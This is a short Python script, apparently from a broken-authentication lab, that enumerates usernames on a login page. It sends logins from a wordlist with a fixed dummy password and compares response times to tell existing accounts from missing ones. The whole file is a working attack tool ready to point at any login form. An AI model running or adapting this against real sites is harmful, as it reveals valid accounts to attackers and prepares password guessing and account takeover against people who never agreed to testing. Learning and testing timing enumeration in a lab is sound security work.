# This script can be used to enumerate users as the response times will differ for existing users. 

import sys
import requests
import os.path

url = "http://brokenauthentication.com/login.php"

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# Define a success response string
valid = "Welcome"

def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))

    return res.text

def main():
    # Check for a wordlist file as an argument
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            if fline.startswith("#"):
                continue
            userid, passwd = unpack(fline.rstrip())
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

if __name__ == "__main__":
    main()
